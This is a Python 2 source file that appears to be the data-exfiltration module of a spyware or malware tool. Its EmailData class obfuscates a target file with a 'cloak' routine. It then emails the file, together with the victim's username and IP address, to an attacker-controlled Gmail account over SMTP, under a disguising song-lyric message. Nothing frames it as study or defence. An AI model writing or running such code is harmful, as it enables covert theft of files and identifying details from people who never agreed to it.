import os
import base64
import cloak
import socket
import getpass
import smtplib
import datetime
from email import Encoders
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart

#---------------------------------------------------------
passkey = '' # gmail password
userkey = '' # gmail username
#---------------------------------------------------------

curentuser = getpass.getuser()

try:
    ip_address = socket.gethostbyname(socket.gethostname())
except:
    pass

class EmailData():

    def __init__(self):
        pass

    def sendData(self, fname, fext):
        attach = fname + fext
        print '[*] Sending data %s ' %(attach)
        self.obfusdata(attach)
        attach = attach + '.dsotm'
        ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        SERVER = "smtp.gmail.com"
        PORT = 465
        USER = userkey
        PASS = passkey
        FROM = USER
        TO = userkey
        SUBJECT = "Attachment " + "From --> " + curentuser + " Time --> " + str(ts)
        TEXT = "There's someone in my head, but it's not me." + '\n\nUSER : ' + curentuser + '\nIP address : ' + ip_address

        message = MIMEMultipart()
        message['From'] = FROM
        message['To'] = TO
        message['Subject'] = SUBJECT
        message.attach(MIMEText(TEXT))

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(attach, 'rb').read())
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
        message.attach(part)

        try:
            server = smtplib.SMTP_SSL()
            server.connect(SERVER, PORT)
            server.ehlo()
            server.login(USER, PASS)
            server.sendmail(FROM, TO, message.as_string())
            server.close()
        except Exception as e:
            error_code = str(e).split('(')[1].split(',')[0]
            print e
            if error_code == '535':
                print e

        return True
        
    def obfusdata(self, data):
        ob = cloak.Cloaking()
        ob.run(data, data+'.dsotm')

